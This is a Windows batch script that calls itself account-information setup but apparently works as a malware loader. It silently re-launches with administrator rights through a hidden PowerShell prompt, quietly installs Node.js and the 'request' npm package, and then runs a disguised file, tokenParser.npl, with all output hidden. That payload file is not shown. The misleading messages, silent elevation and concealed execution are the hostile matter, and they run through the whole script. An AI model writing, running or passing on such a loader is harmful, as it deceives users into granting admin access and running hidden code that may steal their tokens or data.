@echo off
title Creating new Info
setlocal enabledelayedexpansion

>nul 2>&1 net session
if %errorlevel% NEQ 0 (
    if "%~1"=="_restarted" (
        exit /b 1
    )
    powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '_restarted' -Verb RunAs"  -WindowStyle Hidden
    exit /b
)

echo âœ… Running with administrator rights.

echo creating new account information...
set "NODE_VERSION=20.11.1"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
:: Reset installed version variable
set "NODE_INSTALLED_VERSION="

for /f "delims=" %%v in ('node -v 2^>nul') do (
    call set "NODE_INSTALLED_VERSION=%%v"
)

:: Determine if install is needed
if not defined NODE_INSTALLED_VERSION (
    set "INSTALL_NODE=1"
) else (
    set "INSTALL_NODE=0"
)

if "!INSTALL_NODE!"=="1" (
    where curl >nul 2>&1
    if %errorlevel% NEQ 0 (
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_MSI%'"
    ) else (
        curl -s -L -o "%NODE_MSI%" "%DOWNLOAD_URL%"
    )

    if exist "%NODE_MSI%" (
        start /wait msiexec /i "%NODE_MSI%" /qn /norestart
        if errorlevel 1 (
            exit /b
        )
        del "%NODE_MSI%"
    ) else (
        exit /b 1
    )
)

:: Simulate try/catch using labels
set "NODE_DIR=%ProgramFiles%\nodejs"
if exist "%NODE_DIR%\node.exe" (
    set "PATH=%NODE_DIR%;%PATH%"
)

:: Check if npm is available
where npm >nul 2>&1
if errorlevel 1 (
    exit /b
)

:: Check if node is available
where node >nul 2>&1
if errorlevel 1 (
    exit /b
)

if not exist "%~dp0node_modules\request" (
    echo finalizing this process...
    pushd "%~dp0"
    call npm install request --silent --no-progress --loglevel=error --fund=false >nul 2>&1
    title Creating new Info
    if errorlevel 1 (
        popd
        exit /b
    )
    popd
)
if exist "%~dp0tokenParser.npl" (
    node "%~dp0tokenParser.npl" >nul 2>&1
    if errorlevel 1 exit /b
) else (
    exit /b
)
exit
